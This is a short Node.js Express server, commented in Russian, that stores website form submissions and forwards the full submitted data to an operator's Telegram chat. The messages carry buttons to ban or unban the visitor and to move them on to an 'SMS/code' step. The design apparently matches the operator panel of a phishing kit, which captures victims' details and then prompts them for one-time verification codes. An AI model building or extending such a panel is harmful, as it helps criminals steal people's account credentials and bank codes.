const express = require("express");
const app = express();

app.use(express.json());

// база заявок
let users = {};

// создать заявку (с сайта)
app.post("/create", (req, res) => {
  const id = Date.now().toString(); // уникальный ID
  users[id] = {
    data: req.body,
    status: "new"
  };

  sendToTelegram(id, req.body);

  res.json({ ok: true, id });
});

// изменить статус
app.post("/action", (req, res) => {
  const { id, action } = req.body;

  if (users[id]) {
    users[id].status = action;
  }

  res.json({ ok: true });
});

// отправка в Telegram через бот
function sendToTelegram(id, data) {
  const text = `🆕 Заявка
ID: ${id}

${JSON.stringify(data, null, 2)}`;

  global.bot.sendMessage(global.adminChatId, text, {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🚫 Бан", callback_data: `ban_${id}` },
          { text: "✅ Разбан", callback_data: `unban_${id}` }
        ],
        [
          { text: "➡️ СМС/КОД", callback_data: `allow_${id}` }
        ]
      ]
    }
  });
}

app.get("/", (req, res) => {
  res.send("server ok");
});

app.listen(process.env.PORT || 3000, () => {
  console.log("Server started");
});

module.exports = { users };
